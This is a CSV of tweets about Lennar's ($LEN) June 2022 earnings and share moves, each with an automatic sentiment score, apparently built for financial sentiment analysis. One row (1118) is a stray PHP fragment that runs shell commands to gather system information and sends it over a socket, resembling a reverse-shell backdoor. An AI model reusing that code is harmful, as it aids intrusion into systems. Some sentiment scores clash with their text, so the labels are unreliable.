,timestamp,content,symbol,sentiment_score
1024,2022-06-20 21:20:37+00:00,$LEN earnings before open tomorrow cast your votes,LEN,0.0
1025,2022-06-20 23:16:37+00:00,"$LEN reports tomorrow before opening. I’m expecting a big miss, plus downgrade on forecast. This will spook the market as it will be an indicator for the health of real estate.",LEN,-0.1531
1026,2022-06-20 23:50:20+00:00,Tomorrow   $LEN reports earnings before the market opens. 10AM ET: Existing Home Sale  Economists surveyed by The WSJ expect that existing-home sales declined 3.6% in May to a seasonally adjusted annual rate of 5.41 million. That would be the fourth straight month of declines.,LEN,0.2263
1027,2022-06-21 08:08:38+00:00,"Earnings Calendar: US stocks set to release their financials today, June 21 2022. Before Market Open: $ACST Acasti Pharma $FRBK Republic First Bancorp $KLDO Kaleido Biosciences $PDCO Patterson Companies $LEN Lennar Corp After Market Close $LZB La-Z-Boy Inc $BMTX Bm Tech Inc.",LEN,0.0
1028,2022-06-21 10:00:49+00:00,$LEN Lennar Reports Second Quarter 2022 Results Stock News Alerts In Bio,LEN,0.0
1029,2022-06-21 10:14:02+00:00,$LEN Strong earnings this AM...next up for PM $LZB ..further pain ahead...goind down.,LEN,0.0
1030,2022-06-21 10:14:59+00:00,"$LEN  ""The Fed's stated determination to curtail inflation through interest rate increases and quantitative tightening have begun to have the desired effect of slowing sales in some markets and stalling price increases across the country",LEN,0.7184
1031,2022-06-21 10:42:12+00:00,$LEN: “Our cycle time during the quarter increased only slightly sequentially so it appears that the well documented supply chain issues have started to subside.”,LEN,0.4939
1032,2022-06-21 10:54:06+00:00,"Homebuilder Lennar beat on EPS/revs but $LEN exec chairman said it’s “complicated moment in the market” as “weight of a rapid doubling of interest rates over six months, together with accelerated price appreciation, began to drive buyers in many markets to pause and reconsider.”",LEN,0.8573
1033,2022-06-21 11:00:13+00:00,"Top earnings announcements Before Market today include $LEN, $LEN.B, $RSVR, $IH, $ACST #stockstowatch #earnings",LEN,0.2023
1034,2022-06-21 11:20:39+00:00,"⚠️Week Ahead Watchlist - June 21-24: *Tues: Existing Home Sales; $LEN *Wed: Powell Testimony; $KBH $WGO *Thurs: Powell Testimony; Jobless Claims, Mfg., Services PMIs; $FDX $RAD $DRI *Fri: Consumer Sentiment, New Home Sales; $KMX $SPY $QQQ $VIX #JesusIsLord",LEN,0.0
1035,2022-06-21 11:48:07+00:00,"$LEN (part 2) Q1 PR (90 days ago) Mr. Miller concluded, ""The housing industry continues to exhibit strong demand, outweighing supply, and we are confident that we will continue to generate solid growth and enhance our current market position.",LEN,0.8481
1036,2022-06-21 11:48:50+00:00,"$LEN (part 2) Q2 PR (today) Mr. Miller concluded, ""We recognize that current attempts at guidance are tantamount to 'guessing' and not 'guiding.'",LEN,0.0
1037,2022-06-21 11:53:16+00:00,Trending Stocks on #fintwit:  1. $ADN 🥇 2. $K 🥈 3. $LEN 🥉 4. $SPY 5. $SPX 6. $WIRES 7. $TSLA 8. $REV 9. $NIO 10. $SIDU #XGlobalMarkets #stocks #wallstreetbets,LEN,0.0
1038,2022-06-21 11:55:53+00:00,"$LEN - Lennar beat consensus EPS estimate, and revenue that also topped forecasts.  However, the company said it began to see the impact of higher interest rates and rapidly appreciating home prices toward the end of the quarter.",LEN,0.7096
1039,2022-06-21 12:05:03+00:00,"$LEN (66.81, +2.18, +3.4%): beats by $0.74, beats on revs; For the full year, co will leave delivery expectations at approximately 68,000 homes and, at this time, will not provide updated guidance for other items",LEN,-0.0516
1040,2022-06-21 12:05:52+00:00,"Lennar Q2 Adj. EPS $4.69 Beats $3.98 Estimate, Sales $8.36B Beat $8.11B Estimate $LEN",LEN,0.0
1041,2022-06-21 12:28:35+00:00,"Lennar $LEN report better than expected Housing construction net margin increased to 23.5% from 18.6%. New orders rose 4% to 17,792 homes, above the FactSet consensus estimate of 17,429 homes. #StockMarket #trading #Lennar #housingmarket",LEN,0.6124
1042,2022-06-21 12:30:03+00:00,⚡️Stocktwits rankings⚡️ Trending tickers: 1. $GGPI 2. $DWAC 3. $SHIB 4. $VTNR 5. $AVXL 6. $SAVE 7. $ACAD 8. $VALN 9. $GROV 10. $LEN Most active: 1. $BTC 2. $SPY 3. $RDBX 4. $AMC 5. $MULN 6. $QQQ 7. $DOGE 8. $ETH 9. $DWAC 10. $TSLA,LEN,0.4576
1043,2022-06-21 12:42:18+00:00,$LEN the 2nd largest home builder in the U.S just killed earnings. Housing still showing signs of strength and market will certainly be keeping tabs on those metrics!,LEN,0.1007
1044,2022-06-21 12:44:13+00:00,Trending Stocks on #fintwit:  1. $SPY 🥇 2. $LEN 🥈 3. $K 🥉 4. $ADN 5. $SAVE 6. $QQQ 7. $ACAD 8. $HCTI 9. $BKSY 10. $SPX,LEN,0.0
1045,2022-06-21 12:56:53+00:00,Recovery time?  Dow futures start the week up 400.  Long watches $NVDA $K $PTCT $SAVE $LEN $SQ $MU.,LEN,0.0
1046,2022-06-21 13:04:15+00:00,"⚡️Earnings to watch this week⚡️ Follow #crowd5  for weekly updates.  $LEN - Tue, June 21. EPS +$3.98 expected.  $CCL - Thu, June 22. EPS -$1.17 expected. $DRI - Thu, June 23. EPS +2.21 expected.  $FDX - Thu, June 23. EPS +$6.88 expected $KMX - Fri, June 24. EPS +$1.58 expected.",LEN,0.0
1047,2022-06-21 13:11:12+00:00,"Futures up, Europe up, Asia mixed. Fed's Bullard, Waller say tightening has a ways to go. ECB's Lagarde says risk of disorderly market has increased, highlights new tools.    $HIMX cuts Q2 guidance    $LEN beats but sees slowing in Q3.",LEN,-0.1531
1048,2022-06-21 13:14:58+00:00,$LEN Costs up 24% Y/Y. Not trading this one but nice indicator of housing demand &amp; costs. $66 ish,LEN,0.4497
1049,2022-06-21 13:25:05+00:00,Most mentioned tickers on Twitter during Pre-Market: 1. $REV 2. $TSLA 3. $ADN 4. $LEN 5. $UAVS,LEN,0.0
1050,2022-06-21 13:35:44+00:00,Trending Stocks on #fintwit:  1. $SPY 🥇 2. $K 🥈 3. $QQQ 🥉 4. $CNVY 5. $BKSY 6. $SAVE 7. $UAVS 8. $TSLA 9. $SPX 10. $LEN,LEN,0.0
1051,2022-06-21 13:39:07+00:00,"I would be careful with indices #SPY #NASDAQ #DOW heading to Existing homes sales data. $LEN gains might be wiped, after the data release.",LEN,0.4588
1052,2022-06-21 13:40:41+00:00,Lennar rolling out price cuts at their new builds in Vegas this morning $LEN,LEN,-0.296
1053,2022-06-21 13:52:47+00:00,"$LEN noting the rapid rise in rates coupled with accelerated price appreciation is now driving buyers to pause and reconsider with this becoming visible subsequent to quarter end. Expecting slowdown in activity, and rebalance in supply, demand, and home prices",LEN,0.4215
1054,2022-06-21 14:00:03+00:00,"Unusually heavy option volume on today's open include $KR, $LEN, $EPAM, $CAG, and $HST.",LEN,0.0
1055,2022-06-21 14:21:49+00:00,$LEN  CEO is on CNBC: Prices will flex. We set pricing where the market is. Very focused on affordability. Can still produce healthy margin.,LEN,0.6801
1056,2022-06-21 14:26:03+00:00,"$LEN $63.50 Jun 24 2022 PUT ⬇️🌊 Underlying: $67.1 % Difference: 5.67% Daily $ Volume: $280,500 Volume: 2,805 OI: 80 IV: 103.37% Bid/Ask: $0.70/$1.30",LEN,0.0
1057,2022-06-21 14:52:36+00:00,"Existing home sales down 3.4% m/m, roughly in line with estimates of 3.7% “Further sales declines should be expected in upcoming months given housing affordability challenges from sharp rise in mortgage rates,” Lawrence Yun, NAR’s chief economist. $PHM $LEN $XHB $DHI $NVR $TOL",LEN,0.0772
1058,2022-06-21 15:04:36+00:00,$LEN put up great numbers but who is a buyer of home builder stocks in this rate environment…,LEN,0.3716
1059,2022-06-21 15:09:31+00:00,$PHM $LEN $TOL $HD $LOW Housing stocks pulling,LEN,0.0
1060,2022-06-21 15:20:28+00:00,*Lennar Delays Spinoff Due to Capital Markets ‘Choppiness' $LEN,LEN,0.0
1061,2022-06-21 15:35:19+00:00,"if you are interested in $LEN , give @TraceyRyniec a follow, shes on the conference call",LEN,0.4019
1062,2022-06-21 15:42:47+00:00,RTRS:  * LENNAR EXEC SAYS CO EXPECTS COSTS TO RISE AGAIN IN BACK HALF OF 2022 DUE TO LUMBER PRICES  $LEN,LEN,0.0
1063,2022-06-21 16:19:21+00:00,"Additionally, Lennar said that when they do have cancellations, buyers are stepping in to purchase anyway. That's indicative of the still strong job market. $LEN",LEN,0.5106
1064,2022-06-21 16:20:58+00:00,"Additionally, Lennar said that when they do have cancellations, buyers are stepping in to purchase anyway. That's indicative of the still strong job market.  $LEN",LEN,0.5106
1065,2022-06-21 16:24:03+00:00,Interesting that Lennar said there were few impacts in midwest markets like Chicago and Indianapolis. Less price growth in those markets and still affordable anyway. Makes for a more stable market as rates rise. $LEN,LEN,0.8408
1066,2022-06-21 17:50:36+00:00,thanks for the work on $LEN today @TraceyRyniec,LEN,0.4404
1067,2022-06-21 18:00:10+00:00,"Equity Research Analyst, Jay McCanless joins The Watch List on @TDANetwork to speak on $LEN earnings and a $KBH preview. #TuneIn at approx. 11:20am(PT)/2:20pm(ET) for a look at homebuilders.",LEN,0.0
1068,2022-06-21 18:26:44+00:00,The markets that are still seeing minimal to no effect from the $LEN earnings call this morning Florida markets: New Jersey; Maryland; Charlotte; Indianapolis; Chicago; Dallas; Houston; San Antonio; Phoenix; San Diego; Orange County; and the Inland Empire. Pretty interesting,LEN,0.5719
1069,2022-06-21 18:49:18+00:00,"I might write something up on $LEN and $KBH earnings this week so I won’t tweet out the highlights, but if you’re interested @TraceyRyniec did a great job breaking it down this morning.",LEN,0.8807
1070,2022-06-21 19:50:45+00:00,ER LOTTO PLAY $LEN 67C 1.18 70C .33,LEN,0.4824
1071,2022-06-21 21:04:32+00:00,👑Lennar shares are trading higher after the company reported better-than-expected Q2 adjusted EPS and sales results. 🍿   $LEN 🥇,LEN,0.296
1072,2022-06-21 23:39:42+00:00,"$LEN call: ""During the 2nd quarter and so far in June, we had 19 markets continue to perform well. These include our 6 Florida markets, New Jersey, Maryland, Charlotte, Indianapolis, Chicago, Dallas, Houston, San Antonio, Phoenix, San Diego, Orange County and the Inland Empire.",LEN,0.2732
1073,2022-06-21 23:40:26+00:00,"US homebuilder Lennar $LEN (+1.6%) beat second-quarter earnings expectations but flagged uncertainty for the housing market heading into Q3 Said its guidance was closer to ""guessing"" rather than ""guiding"" Not a good look for $JHX $RWC",LEN,-0.7359
1074,2022-06-22 12:17:37+00:00,$LEN underperformed the market on big Q2 report... those comments in the Press Release on forward guidance were just scary...,LEN,0.0
1075,2022-06-22 12:47:29+00:00,Still holding my $LEN put. Cashed out the $XLE call yesterday after dead cat bounce. Probably has legs but wasn’t risking it after that plummet.  Also short calls on $TELL and $SOFI. Trying to boost some income there as cost per share is $3.60 and $5.41 respectively.,LEN,0.5927
1076,2022-06-22 15:21:15+00:00,"sold some Jul-15-22 72.5/74 Call credit spreads on $LEN  , despite crushing their quarter the sentiment is all negative. im assuming range bound stock going forward ... $KBH announces after hours .. no trade on KBH, no weekly options",LEN,-0.5252
1077,2022-06-22 15:44:31+00:00,👑Lennar shares are trading higher. BTIG maintained a Buy rating on the stock and raised its price target from $92 to $97. 🍿   $LEN 🥇,LEN,0.296
1078,2022-06-22 16:11:42+00:00,J. POWW Speech in three lines  - will dump MBS to lower housing prices $TOL $LEN - admits to having zero control over crypto $BTC $ETH - admits he has no control over oil and food  $XLE,LEN,-0.3818
1079,2022-06-22 17:30:12+00:00,"Buck Horne published on $LEN ""Housing Hibernation is Here, But Supply Shortage Only Growing….."" following strong 2Q results with signs though of buyer hesitancy, rising inventory and pricing pressure following the recent rise in rates offset by share gain prospects &amp; SFR demand.",LEN,0.8047
1080,2022-06-22 20:29:24+00:00,#long #watchlist for #trading on #nyse #nasdaq between $60 and $70: $DASH $KRYS $LEN $MRTX $NVCR $STAA,LEN,0.0
1081,2022-06-22 20:30:44+00:00,$LEN Lennar Corporation Declares Quarterly Dividends #dividends Stock News Alerts In Bio,LEN,0.0
1082,2022-06-22 20:32:20+00:00,"$KBH results for May 31 Q very similar to $LEN: -2Q results great: Deliveries flat, ASP +21%, revs +19%, op margin +410bps, EPS +55% -Backlog +43%, net order value +4% -2022 guidance for revs, ASPs, gross margin, &amp; op margin tweaked but ~unchanged -3Q guidance will be on the call",LEN,0.296
1083,2022-06-22 21:30:42+00:00,$LEN Lennar Corp saw an increase of +3.06% today!,LEN,0.3802
1084,2022-06-22 21:46:36+00:00,There's a complete + total disconnect between how homebuilders feel (both $LEN and $KBH past 2 days) and how they are valued in the market.  Market is petrified; execs are bullish. Not sure I've ever seen a gap this big. $XHB $LGIH $DHI $GRBK  cc @ArmsGarrett @AggieCapitalist,LEN,-0.374
1085,2022-06-22 22:35:04+00:00,"And sorry to tell all the doom and gloomers about housing, but the new home market is not collapsing with mortgage rates at 6%. Competition is existing home market where inventory remains near record lows. 3.6% unemployment means plenty of qualified buyers. $KBH $LEN",LEN,-0.6925
1086,2022-06-22 23:04:52+00:00,"Overall summary of the $LEN &amp; $KBH releases/calls: So far, homebuilders see only a very modest demand slowdown from 6% rates, not even enough to lower their guidance through year-end. Supply constraints remain dominant. Build cycle times not falling yet.",LEN,-0.3683
1087,2022-06-22 23:25:29+00:00,"Median price in Las Vegas down -$10,000 in a week.  From $495k to $485K  $TOL $LEN $PHM $NAIL",LEN,0.0
1088,2022-06-22 23:58:51+00:00,$BOXD may be a new multi day runner 👀  $LEN good watch till Friday $PEV new IPO,LEN,0.4404
1089,2022-06-23 00:28:11+00:00,A lot of chatter regarding the $KBH and $LEN earnings...let's do a few polls. First: What will US single family housing starts average for the remainder of 2022 (June - December)?:,LEN,0.0
1090,2022-06-23 02:17:45+00:00,#Housing Market update. From Lennar’s ER call transcript $LEN Small 🧵 #housingmarket,LEN,0.0
1091,2022-06-23 15:00:05+00:00,"Notable gainers among liquid option names this morning include $ETSY (+6.7%), $ADSK (+6.0%), $FDS (+5.7%), $NOW (+5.5%), and $LEN (+5.5%),",LEN,0.0
1092,2022-06-23 19:35:57+00:00,"$LEN +9.7%, $KBH +12.2% on the week.",LEN,0.0
1093,2022-06-23 20:02:54+00:00,$LEN  two days at play.  Yesterday held thru the move from 66.62 HOD at 71.  Expecting a cooling and a push into tomorrow.  I like this. 😊  In this market its important to keep perspective.  5 - 10% gains per trade growing pulling me out of some losses.,LEN,0.7269
1094,2022-06-23 22:08:21+00:00,"Lennar Corporation traded 23% above average volume, $LEN closed up 4.51%",LEN,0.0
1095,2022-06-24 22:10:03+00:00,Lows &amp; Highs from last night: $LEN $70.44 - $72.60 $KBH $28.29 - $29.68 $ACN $283.56 - $299 $FDX $236.14 - $248.47,LEN,-0.2023
1096,2022-06-24 22:10:17+00:00,This week's quarterly reports watchlist: RESULTS! $LEN $70 = $63.68 - $72.59 $KBH $27.15 = $25 - $29.69 $ACN $300 = $273.87 - $299 $FDX $240 = $223.89 - $248.47 Lows - Highs,LEN,-0.2714
1097,2022-06-25 11:31:27+00:00,"$LEN $DHI $TOL Barron's Homebuilders Priced for Disaster, Poised for Recovery",LEN,-0.4767
1098,2022-06-28 13:53:56+00:00,"Bear Forecasts June 28, 2022 06:50:00 PDT 🐻🐻🐻🐻🐻 ticker : log change intraday $APO : -0.48 $CF : 2.00 $CAN : 0.59 $UPS : 0.87 $DXD : -1.34 $VIR : 1.81 $SJT : 0.57 $ENPH : -0.35 $LEN : -0.59 $RKT : 1.52",LEN,0.0
1099,2022-06-28 14:44:50+00:00,$HD Outside Day Down. $LEN trying.,LEN,0.0
1100,2022-06-30 15:21:10+00:00,just sat down... $LEN and $LMT only green on screen... Lennar is the odd one,LEN,-0.3182
1101,2022-06-30 16:33:37+00:00,"What if recent weakness in the economy is contained to real estate and downstream industries like $rh?   Long term we still need more $sox, more $len, more $oxy.  Secular trends will outperform.",LEN,-0.0772
1102,2022-06-30 20:07:59+00:00,"Outside Months: $SBOW, $XHB, $LPI, $XOP, $MDLZ, $YOU, $SJM, $KHC, $ED, $BPT, $NTCT, $CHK, $LEN, $LTHM, $JKS, $BBW, $ATGE, $SWN, $CTVA, $DBA, $WWE, $CLX, $EOLS, $PTEN, $VXX, $ALB, $RRC, $CELH, $GLNG, $HRB, $MNTK, $GIS, $PDD, $ET, $PLAB, $HUSA, $WLL, $MUR, $GO, $PRCT",LEN,0.0
1103,2022-07-01 01:00:54+00:00,Lennar Corp - $LEN 💰 QUOTE $LEN was UP ⬆ on Thu Jun 30 Closed at 70.57 USD for a 1.34% gain from previous close 📈 📈 📈 📊 ANALYSIS Lennar Corp should be nationalized ☭ ☭ ☭,LEN,0.5267
1104,2022-07-01 13:32:29+00:00,#US: Stocks on the move Declines 🔻 Tech $MU -3.3% Research $LRCX -3% Tech $AMAT -2.7%  Advances ▲ Retail $ETSY +3.5% Energy $VLO +2.5% Construction $LEN +2.2%.  #StockMarket #NASDAQ #SP500 #DowJones #USA #Markets,LEN,0.2732
1105,2022-07-01 13:48:47+00:00,$LEN #homebuilder up 5% this morning.. not seeing anything specific,LEN,0.0
1106,2022-07-01 14:32:58+00:00,homebuilders up today on lower rates $DHI $LEN +3% each,LEN,-0.296
1107,2022-07-01 14:56:01+00:00,Best performing large cap stocks in today's early trading Coupang $CPNG Roblox $RBLX DoorDash $DASH $BZ Lennar $LEN DR Horton $DHI Atlassian $TEAM Chewy $CHWY Rocket $RKT American $AWK Moderna $MRNA $OKTA $NU Square $SQ $NVR $SBAC NextEra $NEE Generac $GNRC Bilibili $BILI $SPLK,LEN,0.6369
1108,2022-07-01 15:00:06+00:00,"Notable gainers among liquid option names this morning include $ETSY (+7.1%), $MRNA (+4.6%), $LEN (+4.4%), $PHM (+3.7%), and $DHI (+3.5%),",LEN,0.0
1109,2022-07-01 16:15:44+00:00,$LEN 73.43 long new,LEN,0.0
1110,2022-07-01 18:33:36+00:00,Stocks Trading &lt; 5x P/E with 10%+ EPS growth expected this year:  $WDC 4.9x $BP 4.9x $MFC 4.8x $X 4.8x $SYF 4.7x $SYF 4.7x $LEN 4.6x $GM 4.5x $MOS 4.5x $ALLY 4.3x $DHI 4.1x $CLF 4.1x $M 4.1x $GT 4.1x $CROX 4x $PHM 3.7x $ZIM 3.3x Market doesn't believe these multiples last...,LEN,0.3818
1111,2022-07-01 18:35:27+00:00,Best and worst performing S&amp;P 500 stocks so far today Best: 1 $ETSY 2 Pulte $PHM 3 Lennar $LEN 4 $DHI 5 Las Vegas Sands $LVS 6 $WBD 7 Moderna $MRNA Worst: 1 Lam Research $LRCX 2 $KLAC 3 Monolithic $MPWR 4 Applied Maaterials $AMAT 5 Teradyne $TER 6 Nvidia $NVDA 7 NetApp $NTAP,LEN,0.0516
1112,2022-07-01 19:08:26+00:00,DailyUp5 $ETSY $79.63 8.77% -4.77% -1.84% -42.52% 50.36 $EXPI $12.66 7.60% 3.56% -9.34% -42.98% 47.55 $LE $11.34 6.78% -1.56% -2.24% -35.05% 48.92 $LEN $74.12 5.03% 3.04% -7.64% -10.17% 53.28 $LNN $139.77 5.23% 12.95% 10.93% -9.74% 67.02,LEN,0.0
1113,2022-07-01 21:30:46+00:00,$LEN Lennar Corp is shooting through the roof with a +5.71% increase today!,LEN,0.3802
1114,2022-07-01 21:38:26+00:00,DailyUp5 $EXAS $42.49 7.87% -5.89% -14.70% -37.35% 46.95 $EXPI $12.55 6.63% 2.62% -10.16% -43.49% 46.50 $EXR $182.30 7.16% 5.76% 2.30% -9.14% 62.33 $IVR $15.48 5.45% 15.44% -13.03% -30.27% 56.59 $LEN $74.59 5.70% 3.70% -7.05% -9.60% 54.18,LEN,0.0
1115,2022-07-01 21:43:25+00:00,Best performing large cap stocks from today Coupang $CPNG +18% Chewy $CHWY +7.1% Roblox $RBLX +6.7% DocuSign $DOCU +6.7% CrowdStrike $CRWD +6.3% $WBD +6.2% $OKTA +6.2% Datadog $DDOG +6.1% DR Horton $DHI +5.9% DoorDash $DASH +5.9% Lennar $LEN +5.7% BioNTech $BNTX +5.6%,LEN,0.6369
1116,2022-07-02 01:28:21+00:00,Best performing large cap stocks from today Coupang $CPNG +18% Chewy $CHWY +7.1% Roblox $RBLX +6.7% DocuSign $DOCU +6.7% CrowdStrike $CRWD +6.3% $WBD +6.2% $OKTA +6.2% Datadog $DDOG +6.1% DR Horton $DHI +5.9% DoorDash $DASH +5.9% Lennar $LEN +5.7% BioNTech $BNTX +5.6%,LEN,0.6369
1117,2022-07-02 01:29:50+00:00,Best and worst performing S&amp;P 500 stocks so far today Best: 1 $ETSY 2 Pulte $PHM 3 Lennar $LEN 4 $DHI 5 Las Vegas Sands $LVS 6 $WBD 7 Moderna $MRNA Worst: 1 Lam Research $LRCX 2 $KLAC 3 Monolithic $MPWR 4 Applied Maaterials $AMAT 5 Teradyne $TER 6 Nvidia $NVDA 7 NetApp $NTAP,LEN,0.0516
1118,2022-07-02 06:03:48+00:00,"$dir = shell_exec(""pwd"");               $sysinfo = shell_exec(""uname -a"");               $time = Shell_exec(""time"");               $len = 1337;               fputs($sockfd, ""User "", $sysinfo, ""connected @ "", $time, ""\n\n"");",LEN,0.4767
1119,2022-07-02 19:35:33+00:00,"Lennar Corporation traded 27% above average volume, $LEN closed up 5.71%",LEN,0.0
1120,2022-07-03 16:07:24+00:00,Posted options flow for following tickers.  100 ❤️ and🔁if you are following and like me to continue posting! Thank you ❤️❤️  $BA $AAL $INTC $NVDA $TSM $LEN $AAPL $UAL $AMZN $FUN $BABA $TSLA $XLV $XLE $IWM $QQQ $SPY,LEN,0.6476
